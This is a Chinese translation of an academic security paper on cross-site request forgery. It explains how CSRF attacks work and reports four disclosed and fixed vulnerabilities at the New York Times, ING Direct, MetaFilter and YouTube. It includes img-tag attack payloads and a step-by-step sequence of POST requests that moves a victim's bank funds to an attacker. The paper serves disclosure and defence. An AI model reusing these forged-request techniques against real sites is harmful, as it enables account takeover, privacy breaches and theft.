# Cross-Site Request Forgeries: Exploitation and Prevention
### 跨站点请求伪造：开发和预防
William Zeller* and Edward W. Felten*†  
*Department of Computer Science  
*Center for Information Technology Policy  
†Woodrow Wilson School of Public and International Affairs
Princeton University  
fwzeller,felteng@cs.princeton.edu

修订10/15/2008：注意到“纽约时报”已经修复了下面所述的漏洞。 另外澄清了我们的服务器端CSRF保护建议并不能阻止[17]中描述的主动网络攻击。  
本文的最新版本可以在这里找到  
http://citp.princeton.edu/csrf/

摘要  
跨站点请求伪造（CSRF）攻击发生在恶意网站导致用户的Web浏览器对受信任站点执行不必要的操作时。这些攻击被称为基于Web的漏洞的“睡眠巨人”，因为互联网上的许多站点都不能对其进行保护，因为它们在很大程度上被Web开发和安全社区忽视。我们提出了四个严重的CSRF漏洞在四个主要网站上发现，包括我们认为是首次发布的涉及金融机构的攻击。这些漏洞允许攻击者从用户银行帐户中转账，获得用户电子邮件地址，侵犯用户隐私和妥协用户帐户。我们推荐能够完全保护站点免受CSRF攻击的服务器端更改（我们已经实现的）。我们还描述了服务器端解决方案应该具有的功能（缺少这些功能导致CSRF保护不必要地破坏了典型的Web浏览行为）。此外，我们还实施了一个客户端浏览器插件，即使站点没有采取措施保护自身，也可以保护用户免受某些类型的CSRF攻击。我们希望提高CSRF攻击的意识，同时向负责的Web开发人员提供保护用户免受这些攻击的工具。

1.简介  
跨站点请求伪造(1)（CSRF）攻击发生在恶意网站导致用户的Web浏览器对受信任站点执行不必要的操作时。 这些攻击被称为基于Web的漏洞的“睡眠巨人”[23]，因为互联网上的许多站点都不能对其进行保护，因为它们在很大程度上被Web开发和安全社区忽视。 CSRF攻击不会出现在Web Security Threat Classification [12]中，很少在学术或技术文献中进行讨论.(2) CSRF攻击简单易于诊断，易于开发，易于修复。 它们存在是因为Web开发人员对于CSRF攻击的原因和严重性没有受过教育。 Web开发人员也可能会受到错误的印象，即针对更好的跨站脚本（XSS）问题的防御也可以防范CSRF攻击。  
在第3节中，我们介绍了四个主要站点发现的四个严重的CSRF漏洞。 这些漏洞允许攻击者从用户银行帐户中转账，收获用户电子邮件地址，侵犯用户隐私和妥协用户帐户。


---
(1) 跨站点请求伪造攻击也称为跨站点参考伪造，XSRF，会话骑乘和混淆副攻击。我们使用术语CSRF，因为它似乎是这种攻击最常用的术语。  
(2) 在ACM数字图书馆搜索“跨站脚本”（与CSRF不同）返回72篇论文，搜索“xsrf OR csrf”只返回四篇论文。 在Safari Books Online上搜索“xss”（收集了4752本技术书籍），该书出现在96本书中，而“csrf OR xsrf”只出现在13本书中。

---



在第4.1节中，我们建议可以完全保护站点免受CSRF攻击的服务器端更改（我们已经实施）。这些建议具有优于先前提出的解决方案的优点，因为它们不需要服务器状态，并且不会破坏典型的Web浏览行为此外，我们实施了一个客户端浏览器插件，可以保护用户免受某些类型的CSRF攻击（第4.2节）。服务器端保护允许站点完全保护自己免受CSRF攻击，而客户端保护允许用户采取主动措施来保护自身免受许多类型的CSRF攻击，即使站点没有采取措施保护自身。我们希望提高CSRF攻击的意识，同时向负责的Web开发人员提供保护用户免受这些攻击的工具。

2.CSRF概述  
图1，图2和图3显示了CSRF攻击是如何工作的。  
下面我们使用一个具体的例子更详细地描述CSRF攻击。  

2.1一个例子  
让我们考虑一个容易遭受CSRF攻击的网站的假设例子。该网站是一个基于网络的电子邮件网站，允许用户发送和接收电子邮件。该站点使用隐式身份验证（见第2.2节）来验证其用户。一个页面 http://example.com/compose.htm 包含一个HTML表单，允许用户输入收件人的电子邮件地址，主题和消息以及一个“发送电子邮件”按钮。

```
<form action="http://example.com/send_email.htm" method="GET">  
Recipient’s Email address: <input type="text" name="to">  
Subject: <input type="text" name="subject">  
Message: <textarea name="msg"></textarea>
<input type="submit" value="Send Email">
</form>
```

当example.com的用户点击“发送电子邮件”时，他输入的数据将作为GET请求发送到 http://example.com/send_email.htm 。由于GET请求只需将表单数据附加到URL，用户将被发送到以下URL（假设他输入“bob@example.com”作为收件人，“hello”作为主题，“该提案的状态如何？”作为消息）：
```
http://example.com/send_email.htm?to=bob%40example.com&subject=hello&msg=What%27s+the+status+of+that+proposal%3F(3)
```

---
(3) URL数据编码，将@转换成％40等等

---


发送email.htm的页面将收到它收到的数据，并从用户发送电子邮件给收件人。注意，发送email.htm只需要获取数据并对该数据执行操作。它不在乎发出请求的位置，只有请求已经出现。这意味着，如果用户手动将上述URL输入到浏览器中，则example.com仍然会发送电子邮件。例如，如果用户在浏览器中输入以下三个URL，则发送email.htm将发送三封电子邮件（每个邮件给Bob，Alice和Carol）：
```
http://example.com/send_email.htm?to=bob%40example.com&subject=hi+Bob&msg=test
http://example.com/send_email.htm?to=alice%40example.com&subject=hi+Alice&msg=test
http://example.com/send_email.htm?to=carol%40example.com&subject=hi+Carol&msg=test
```

在这里可能发生CSRF攻击，因为send email.htm会接收到任何数据，并发送电子邮件。它不会验证数据源自compose.htm上的表单。因此，如果攻击者可以使用用户send_email.htm的请求，则该页面将导致example.com代表包含攻击者选择的任何数据的用户发送电子邮件，并且攻击者将成功执行CSRF攻击。



为了利用此漏洞，攻击者需要强制用户的浏览器发送send_email.htm的请求，以执行一些恶意的操作。（我们假设用户访问攻击者控制的站点，目标站点不会防御CSRF攻击）。具体来说，攻击者需要从他的站点到example.com建立一个跨站点请求。不幸的是，HTML提供了许多方法来提出这样的请求。例如，\<img\>标签将导致浏览器加载任何设置为src属性的URI，即使该URI不是图像（因为浏览器只能在加载URI后才能告诉URI是一个图像）。攻击者可以使用以下代码创建一个页面：
```
<img src="http://example.com/send_email.htm?
to=mallory%40example.com&subject=Hi&msg=My+email+address+has+been+stolen">
```

当用户访问该页面时，将发送请求send_email.htm，然后将从用户向Mallory发送电子邮件。这个例子与我们在“纽约时报”网站上发现的实际漏洞几乎相同，我们在3.1节中介绍。  
攻击者可能会导致用户浏览器对其他站点执行不必要的操作时，CSRF攻击成功。要使此操作成功，用户必须能够执行此操作。 CSRF攻击通常与用户一样强大，意味着用户可以执行的任何操作也可以由攻击者使用CSRF攻击执行。因此，网站给用户的力量越大，可能的CSRF攻击就越严重。  
几乎每个使用隐式认证的站点都可以成功实施CSRF攻击（见第2.2节），并且没有明确地保护自己免受CSRF攻击。  
同源策略（见附录B）旨在防止攻击者访问第三方站点上的数据。此策略不会阻止发送请求，它只能防止从第三方服务器返回的数据读取的攻击。由于CSRF攻击是发送请求的结果，所以同源策略不会防止CSRF攻击。


![image](https://github.com/guangguang831/ns/blob/master/2017-2/%E5%A4%A7%E4%BD%9C%E4%B8%9A/1_cn.png)  
图1：这里，Web浏览器已建立与受信任站点的认证会话。 只有当Web浏览器通过授权会话发出请求时，才能执行“可信操作”。

![image](https://github.com/guangguang831/ns/blob/master/2017-2/%E5%A4%A7%E4%BD%9C%E4%B8%9A/2_cn.png)  
图2：有效请求。 网络浏览器尝试执行受信任的操作。 受信任的站点确认Web浏览器已通过身份验证，并允许执行该操作。

![image](https://github.com/guangguang831/ns/blob/master/2017-2/%E5%A4%A7%E4%BD%9C%E4%B8%9A/3_cn.png)  
图3：CSRF攻击。攻击网站导致浏览器向受信任的站点发送请求。 受信任的站点从Web浏览器看到一个有效的经过身份验证的请求，并执行“可信任操作”。 CSRF攻击是可能的，因为网站认证Web浏览器，而不是用户。

2.2认证和CSRF  
CSRF攻击经常利用目标网站的认证机制。问题的根源在于，Web身份验证通常保证来自某个用户浏览器的请求的站点; 但不能确保用户实际请求或授权请求。  
例如，假设Alice访问目标站点T.T给Alice的浏览器一个包含伪随机会话标识符sid的cookie，以跟踪她的会话。Alice被要求登录到该站点，并在输入有效的用户名和密码后，该站点记录了Alice登录到会话sid的事实。当Alice向T发送请求时，她的浏览器会自动发送包含sid的会话cookie。T然后使用其记录将会话识别为来自Alice。现在假设Alice访问恶意网站M.由M提供的内容包含Javascript代码或导致Alice的浏览器向T发送HTTP请求的图像标签。由于请求将转到T，Alice的浏览器“有帮助”附加会话cookie sid要求。在查看请求时，T推测来自Cookie的请求来自Alice，所以T对Alice的帐户执行请求的操作。 这是一次成功的CSRF攻击。  
大多数其他Web认证机制也遇到同样的问题。例如，HTTP BasicAuth机制[22]将让爱丽丝告诉她的浏览器她的T的网站的用户名和密码，然后浏览器将“有帮助”地将用户名和密码附加到将来发送给T的请求。或者，T可能会使用客户端边SSL证书，但同样的问题会导致浏览器会“有帮助”地使用证书来向T的站点执行请求。类似地，如果T通过她的IP地址认证Alice，则CSRF攻击是可能的。  
一般来说，每当认证发生时，由于哪个站点发送了一个请求以及哪个浏览器来自哪里，那么就有一个CSRF攻击的危险。 原则上，可以通过要求用户对发送到某个站点的每个请求采取明确的，不可扩展的操作（例如重新输入用户名和密码）来消除这种危险，但实际上这会导致主要的可用性问题。 最标准和广泛使用的认证机制不能防止CSRF攻击，因此在其他地方必须寻求实际的解决方案。

2.3 CSRF攻击载体  
要使攻击成功，用户必须登录到目标站点，并且必须访问攻击者的站点或攻击者部分控制的站点。  
如果服务器包含CSRF漏洞，并且接受GET请求（如上例所示），则可以在不使用JavaScript的情况下进行CSRF攻击（例如，可以使用简单的\<img\>标记）。 如果服务器只接受POST请求，则需要JavaScript才能将POST请求从攻击者的站点发送到目标站点。

2.4 CSRF与XSS  
最近非常注意跨站脚本（XSS）[20]漏洞。 当攻击者注入恶意代码（通常为JavaScript）转换为网站，目的是定位该网站的其他用户。 例如，一个网站可能允许用户发表评论。 这些注释由用户提交，存储在数据库中，并显示给该网站的所有未来用户。 如果攻击者能够在注释中输入恶意JavaScript，则JavaScript将嵌入到包含注释的任何页面上。 当用户访问该站点时，攻击者的JavaScript将以目标站点的所有权限执行。 嵌入到目标站点中的恶意JavaScript将能够发送和接收网站上任何页面的请求，并访问该站点设置的Cookie。从XSS攻击的保护措施需要网站仔细筛选任何用户输入，以确保不会注入恶意代码。  
CSRF和XSS攻击的不同之处在于XSS攻击需要JavaScript，而CSRF攻击则不需要。 XSS攻击要求网站接受恶意代码，而使用CSRF攻击恶意代码位于第三方站点。 过滤用户输入将防止恶意代码在特定站点上运行，但不会阻止恶意代码在第三方站点上运行。 由于恶意代码可以在第三方站点上运行，所以防止XSS攻击不能保护站点免受CSRF攻击。 如果一个站点容易遭受XSS攻击，那么它容易遭受CSRF攻击。 如果一个站点完全受到XSS攻击的保护，那么很可能仍然容易受到CSRF攻击。

3 .CSRF漏洞  
在本节中，我们描述了我们发现的四个漏洞。这些攻击是通过测量大约十个流行网站的列表来发现的。 我们分析的许多网站都有CSRF漏洞或漏洞的历史（例如，网页搜索将显示一个已经被修复的CSRF漏洞的报告）。事实上，这么多网站容易遭受CSRF攻击，直到第三方披露这些问题表明，许多网站管理员没有受到关于CSRF漏洞的风险和存在的教育。  
我们相信ING Direct，Metafilter和YouTube以及“纽约时报”已经纠正了我们下面描述的漏洞。 所有四个站点似乎已经使用类似于我们在4.1节中提出的方法来解决问题。


3.1纽约时报（nytimes.com）  
纽约时报网站是“网络上第一大报纸网站”[10]。  
我们在NYTimes.com中发现了一个CSRF漏洞，使得用户的电子邮件地址可供攻击者使用。如果您是NYTimes.com会员，则可以使用此攻击来确定您的电子邮件地址，并使用它发送垃圾邮件或识别您。  
这种攻击利用了NYTimes.com的“Email This”功能。“Email This”是一种工具，允许用户通过指定收件人的电子邮件地址和可选的个人消息发送链接到NYTimes.com文章。收件人收到一封类似于以下内容的电子邮件：  
该页面已通过以下方式发送给您：[用户的电子邮件地址]  
发件人的留言：  
你也许会对这个感兴趣。  
国内版  
研究人员寻找窃取加密数据的方法  
约翰•马克福夫  
一个计算机安全研究小组已经开发出一种从计算机硬盘窃取加密信息的方法。

要利用此漏洞，攻击者会导致登录用户的浏览器向 NYTimes.com “Email This”页面发送请求。 接受“Email This”请求的页面不会防止CSRF攻击，因此用户的浏览器将会将请求发送到 NYTimes.com，这将触发它发送电子邮件到攻击者选择的地址。如果攻击者将收件人电子邮件地址更改为他自己的电子邮件地址，他将收到包含用户电子邮件地址的NYTimes.com的电子邮件。  
利用此漏洞非常简单。每个NYTimes.com上的文章包含指向“Email This”页面的链接，其中包含用户输入收件人电子邮件地址的表单。 此表单还包含每个文章唯一的隐藏变量。 这是一个示例形式：

```
<form 
action="http://www.nytimes.com/mem/emailthis.html"
method="POST"
enctype="application/x-www-form-urlencoded">
<input type="checkbox" id="copytoself" name="copytoself" value="Y">
<input id="recipients" name="recipients" type="text" maxlength="1320" value="">
<input type="hidden" name="state" value="1">
<textarea id="message" name="personalnote" maxlength="512"></textarea>
<input type="hidden" name="type" value="1">
<input type="hidden" name="url" value="[...]">
<input type="hidden" name="title" value="[...]">
<input type="hidden" name="description" value="[...]">
...
</form>
```


由于NYTimes.com不区分GET和POST请求，攻击者可以将此表单转换为GET请求，以后可以在\<img\>标记中使用。将表单转换为GET请求涉及将每个参数附加到URL的查询字符串（格式为NAME = VALUE，以＆符号分隔）。  
一旦攻击者构建了URL，他就可以将其设置为]<img\>标签的SRC属性。如果NYTimes.com的登录用户访问包含此\<img\>标签的任何页面，浏览器将使用攻击者的参数加载“Email This”页面，导致NYTimes.com向包含用户电子邮件的攻击者发送电子邮件地址。攻击者可以存储此电子邮件地址以供日后滥用（例如，为垃圾邮件发送），或使用电子邮件地址来识别他自己网站的访问者。这可能导致严重的隐私后果，例如允许有争议地点的运营商（例如政治或非法）识别其用户。  
我们在Firefox 2.0.0.6，Opera 9.23和Safari 3.0.3（522.15.5）中验证了此次攻击。由于附录A中描述的原因，它在Internet Explorer中不起作用。我们在2007年9月通知了“纽约时报”这个漏洞。这是2008年10月1日修复的。

3.2 ING Direct（ingdirect.com）  
“ING DIRECT是美国第四大储蓄银行，拥有超过620亿美元的资产，为超过410万的客户提供卓越的储蓄和抵押贷款服务。”[15]  
我们在ING网站上发现了CSRF漏洞，允许攻击者代表用户打开更多帐户，并将资金从用户帐户转移到攻击者的帐户。正如我们在第2.2节中讨论的那样，ING使用SSL并不能阻止这种攻击。我们认为这是第一次发布涉及金融机构的CSRF攻击。  
由于ING没有明确地防范CSRF攻击，因此从用户帐户转移资金就像模拟用户在转移资金时所采取的步骤一样简单。 这些步骤包括以下操作：
1.	攻击者代表用户创建一个支票账户。(4)

---
(4) ING Direct允许以最初的金额即时创建支票账户。

---


（a）攻击者使用户的浏览器访问ING的“打开新帐户”页面：  
- 向 https://secure.ingdirect.com/myaccount/INGDirect.html?command=gotoOpenOCA 发送GET请求 

（b）攻击者导致用户的浏览器选择一个“单一”帐户：  
- 通过以下参数向 https://secure.ingdirect.com/myaccount/INGDirect.html 发送POST请求：  

```
command=ocaOpenInitial&YES, I 
WANT TO CONTINUE..x=44&YES, I 
WANT TO CONTINUE..y=25
```

（c）攻击者选择任意数量的资金从用户的储蓄账户转移到新的欺诈账户：  
- 通过以下参数向 https://secure.ingdirect.com/myaccount/INGDirect.html 发送POST请求：
```
command=ocaValidateFunding&PRIMARY
CARD=true&JOINTCARD=true&Account
Nickname=[ACCOUNT NAME]&FROMACCT=
0&TAMT=[INITIAL AMOUNT]&YES, I
WANT TO CONTINUE..x=44&YES, I
WANT TO
CONTINUE..y=25&XTYPE=4000USD
&XBCRCD=USD
…其中[ACCOUNT NAME]是用户将看到的账户的名称，[INITIAL AMOUNT]是开户时转入新账户的金额。  
帐号名称可以是任何字符串，攻击者不需要知道它是一个简单的昵称，它将用于新帐户。
```
（d）攻击者使用户的浏览器点击最终的“开户”按钮，导致ING代表用户开立一个新的支票帐户：  
- 通过以下参数向 https://secure.ingdirect.com/myaccount/INGDirect.html 发送POST请求：
```
command=ocaOpenAccount&Agree
ElectronicDisclosure=yes&AgreeTerms
Conditions=yes&YES, I WANT TO
CONTINUE..x=44&YES, I WANT TO
CONTINUE..y=25&YES, I WANT TO
CONTINUE.=Submit
```

2.攻击者将自己作为收款人添加到用户帐户中。  
（a）攻击者导致用户的浏览器访问ING的“添加人员”页面：  
- 向 https://secure.ingdirect.com/myaccount/INGDirect.html?command=goToModifyPersonalPayee&Mode=Add&from=displayEmailMoney 发送GET请求

（b）攻击者使用户的浏览器输入攻击者的信息：  
- 通过以下参数向 https://secure.ingdirect.com/myaccount/INGDirect.html 发送POST请求：
```
command=validateModifyPersonalPayee
&from=displayEmailMoney&PayeeName
=[PAYEE NAME]&PayeeNickname=&chk
Email=on&PayeeEmail=[PAYEE EMAIL]
&PayeeIsEmailToOrange=true&Payee
OrangeAccount=[PAYEE ACCOUNT NUM]&
YES, I WANT TO CONTINUE..x=44
&YES, I WANT TO CONTINUE..y=25
…其中[PAYEE NAME]是攻击者的名字，[PAYEE EMAIL]是攻击者的电子邮件地址，[PAYEE ACCOUNT NUM]是攻击者的ING帐号。
```

（c）攻击者使用户的浏览器确认攻击者是有效的收款人：  
- 通过以下参数向 https://secure.ingdirect.com/myaccount/INGDirect.html 发送POST请求：
```
command=modifyPersonalPayee&from=
displayEmailMoney&YES, I WANT TO
CONTINUE..x=44 &YES, I WANT TO
CONTINUE..y=25
```

3.攻击者将资金从用户账户转移到自己的账户。  
（a）攻击者使用户的浏览器输入一笔钱发送给攻击者：
- 通过以下参数向 https://secure.ingdirect.com/myaccount/INGDirect.html 发送POST请求：
```
command=validateEmailMoney&CNSPayID
=5000&Amount=[TRANSFER AMOUNT]
&Comments=[TRANSFER MESSAGE]&YES,
I WANT TO CONTINUE..x=44 &YES, I
WANT TO
CONTINUE..y=25&show=1&button=Send
Money
…其中[TRANSFER AMOUNT]是从用户账户转移到攻击者账户的金额，[TRANSFER MESSAGE]是包含在交易中的消息。
```

（b）攻击者使用户的浏览器确认应发送资金：
- 通过以下参数向 https://secure.ingdirect.com/myaccount/INGDirect.html 发送POST请求：
```
command=emailMoney&Amount=
[TRANSFER AMOUNT]Comments=
[TRANSFER MESSAGE]&YES, I WANT
TO CONTINUE..x=44&YES, I WANT TO
CONTINUE..y=25
…其中[TRANSFER AMOUNT]和[TRANSFER MESSAGE]与上面的3（a）相同。
```


为了利用这种攻击，攻击者可以创建一个页面，使用JavaScript连续发出上述POST请求。这对用户是不可见的。  
这种攻击假定用户没有将其他收款人添加到他的ING Direct支票账户。这次攻击很可能已经被修改，没有这个限制。  
我们在Firefox 2.0.0.3和Internet Explorer 7.0.5中验证了这一攻击。我们没有在其他浏览器中测试这种攻击。我们已经通知了ING这个漏洞，并已经修复。


3.3 MetaFilter（metafilter.com）  
> “MetaFilter是一个博客...任何人都可以提供链接或评论。”目前每月有超过5万名用户和超过350万的独立访问者[1]。

我们在MetaFilter中发现了一个允许攻击者控制用户帐户的CSRF漏洞。  
MetaFilter有一个“丢失的密码”页面[6]，允许用户请求他的密码。  
输入用户名将导致MetaFilter将包含用户当前密码的电子邮件发送到与该用户关联的电子邮件地址。 这意味着能够更改用户电子邮件地址的攻击者可以使用“丢失的密码”页面来接收用户的密码，并使用该密码来控制用户的帐户。  
我们发现的CSRF攻击允许攻击者更改用户的电子邮件地址。 为了利用这种攻击，攻击者可以让用户的浏览器发送一个请求到用来更新用户配置文件的页面。 此页面接受用户的电子邮件地址作为参数，可以用攻击者的地址替换。 一个示例攻击是嵌入在页面上的以下HTML：
```
<img src="
http://metafilter.com/contribute/customize_
action.cfm?user_email=[ATTACKER’S EMAIL]"/>
```

虽然这将改变任何登录用户的电子邮件地址，攻击者将不知道哪个用户的帐户被修改。 攻击者可以通过利用另一个MetaFilter功能来发现这个功能，该功能允许用户将其他用户标记为“联系人”。攻击者可以使用与上述类似的CSRF，以使用户在不知情的情况下将攻击者添加到他的联系人列表中。  
我们在Firefox 2.0.0.6中验证了这个攻击。 由于附录A中描述的原因，它在Internet Explorer中不起作用。我们没有在其他浏览器中测试此攻击。 我们向MetaFilter报告了这个漏洞，并确认它在两天内得到修复。

3.4 YouTube (youtube.com)  
> “YouTube是在线视频的领导者，也是通过Web体验观看和分享全球原创视频的首要目的地”[13]。 2006年6月的一项研究发现，“仅YouTube就占了所有HTTP流量的20％，即互联网上所有流量的近10％。”[14]

我们几乎在用户可以在YouTube上执行的所有操作中，都发现了CSRF漏洞。  
攻击者可能已经将视频添加到用户的“收藏夹”中，将自己添加到用户的“朋友”或“家人”列表中，以用户的名义发送任意消息，标记为不合适的视频，自动与用户的联系人共享视频，用户转到“频道”（由一个人或组发布的一组视频）并将视频添加到用户的“快速列表”（用户打算在稍后观看的视频列表）中。 例如，要将视频添加到用户的“收藏夹”，攻击者只需将此\<img\>标签嵌入到任何网站：
```
<img src="http://youtube.com/watch_ajax?
action_add_favorite_playlist=1&video_
id=[VIDEO ID]&playlist_id=&add_to_favorite=
1&show=1&button=AddvideoasFavorite"/>
```

攻击者可能使用此漏洞影响视频的流行度。例如，将视频添加到足够数量的用户的“收藏”将导致YouTube在其“最受欢迎”（视频“最受欢迎”视频列表）中显示视频。除了增加视频的受欢迎程度，攻击者可能会导致用户在不知情的情况下将视频标记为不适当的内容，试图使YouTube将其从网站中删除。
这些攻击也可能被用来侵犯用户的隐私。  
YouTube允许用户只将视频提供给朋友或家人。这些攻击可能允许攻击者自动将自己添加到用户的“朋友”或“家庭”列表，这将允许他访问由用户上传并限制到这些列表的任何私人视频。  
攻击者可能已经与用户的整个联系人列表（“朋友”，“家人”等）共享一个视频。“共享”仅仅意味着发送一个链接到一个视频附带一个可选的消息。该消息可以包含一个链接，这意味着攻击者可以强制用户包含一个链接到包含攻击的网站。接收到该消息的用户可能会点击该链接，从而使得攻击以病毒传播。  
我们在Firefox 2.0.0.6中验证了这些攻击。由于附录A中描述的原因，它们在Internet Explorer中不工作。我们没有在其他浏览器中测试这些攻击。我们将这些漏洞报告给YouTube，并且似乎已经得到更正。
